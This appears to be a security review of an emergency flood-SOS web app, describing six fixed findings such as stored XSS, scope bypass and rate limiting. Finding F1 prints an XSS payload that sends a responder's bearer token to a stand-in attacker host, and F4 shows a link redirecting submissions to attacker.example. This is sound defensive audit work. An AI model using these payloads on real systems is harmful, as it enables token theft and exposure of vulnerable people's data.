# Security review — Phase 6

Conducted 2026-09-15 against the Phase 0–4 codebase, before any deployment.
All findings below are **fixed**; the notes explain the attack so the fix is not
quietly reverted later.

## F1 — Stored XSS in the responder console · CRITICAL · fixed

**Attack.** `POST /api/sos` is public and unauthenticated. The `note` and
`contact_name` fields were stored verbatim and rendered into `ops.html` with
`innerHTML`. A submission containing

```
<img src=x onerror="fetch('https://attacker/?t='+localStorage.seraphim_token)">
```

executes in the browser of every responder who opens the queue, exfiltrating their
bearer token — which grants read access to the name, phone number, precise location
and medical needs of everyone who asked for help.

This is the most serious defect found: an anonymous attacker escalates to full access
to the most sensitive data in the system, using the one endpoint that must stay open
to the public.

**Fix.** An `esc()` escaper applied to every interpolated value in `ops.html`,
`sos.html` and `index.html`, plus a restrictive Content-Security-Policy (F5) as
defence in depth. Escaping happens at render, not on input — storing exactly what
someone typed matters when the text is a plea for help.

## F2 — Province scope bypass · HIGH · fixed

**Attack.** `scope_province` was enforced in the queue listing but **not** in
`GET /api/sos/:id` or `PATCH /api/sos/:id`. A volunteer scoped to one district could
read and modify any request in the country by id. Ids begin with a millisecond
timestamp, so they are partially enumerable rather than unguessable.

**Fix.** Scope is enforced in `detail()` and `update()` as well, returning `404` (not
`403`) so a scoped responder cannot confirm that an out-of-scope request exists.

## F3 — Deployable default IP salt · MEDIUM · fixed

**Attack.** `IP_SALT` shipped as `change-me-before-deploy`. Deployed unchanged, every
`ip_hash` is computed with a publicly known salt, so anyone who obtains the database
can recover submitter IP addresses by hashing candidates — the IPv4 space is small
enough to enumerate. That de-anonymises people who asked for help.

**Fix.** The Worker refuses to accept submissions while the placeholder salt is in
place, returning a clear configuration error. Failing closed is correct here: a
deployment that silently de-anonymises its users is worse than one that is visibly
broken.

## F4 — API origin taken from the URL query · MEDIUM · fixed

**Attack.** `sos.html` accepted `?api=` from the query string. A link such as
`https://seraphim.example/sos.html?api=https://attacker.example` sends the victim's
name, phone, location, health needs and consent flag to an attacker-controlled server,
while the page still looks legitimate. Plausible during a flood, when links spread
fast through LINE and Facebook groups.

**Fix.** The query parameter is honoured only for localhost (developer convenience);
any other value is ignored in favour of the built-in origin.

## F5 — No Content-Security-Policy · MEDIUM · fixed

**Fix.** `web/_headers` (Cloudflare Pages) sets a CSP restricting scripts to `self`
and the two CDNs actually used, blocks framing, and disables the geolocation and
camera permissions the pages do not need. This turns a future HTML-injection mistake
from account takeover into a broken element.

## F6 — Rate limiting would have blocked flood victims · HIGH · fixed

Found by load testing rather than code review, which is why Phase 6 does both.

**Problem.** A single per-IP limit of 12 submissions per 10 minutes. Thai mobile
networks use carrier-grade NAT, so thousands of subscribers share one public address:
modelling 1,000 users behind one carrier NAT, **988 legitimate requests are rejected**.
The people most likely to share a mobile NAT are precisely those without a landline to
call 1784 from.

This is a security control causing the harm it exists to prevent.

**Fix.** Two buckets. A **device** bucket (8 per 10 min) polices the real actor; an **IP**
bucket (300, or 900 when the report includes a life-threatening need) stops one machine
hammering without policing a carrier. Verified: 400 distinct devices behind one NAT
reporting `medical` all get through; one device spamming is stopped at 8. Rate-limited
submissions are queued client-side and retried, so a 429 delays a request rather than
losing it.

A false accept costs one triage review; a false reject can cost a life.

## Accepted risks (documented, not fixed)

- **Responder tokens live in `localStorage`.** With F1 fixed and F5 in place the
  realistic theft path is closed. Proper short-lived sessions belong with the
  `.go.th` sign-in work, which needs an email provider.
- **Rate limiting is per IP** and can be evaded by rotating addresses. Cloudflare's
  own bot controls sit in front; the more meaningful defence is responder triage,
  since a request that survives human review is the one that costs a boat.
- **Ids embed a creation timestamp.** Convenient for ordering, and no longer useful to
  an attacker now that scope is enforced everywhere, but worth remembering.
- **The Worker has never been executed here** (no node). Its logic is held to
  `api/conformance/`, and the schema is exercised through SQLite.
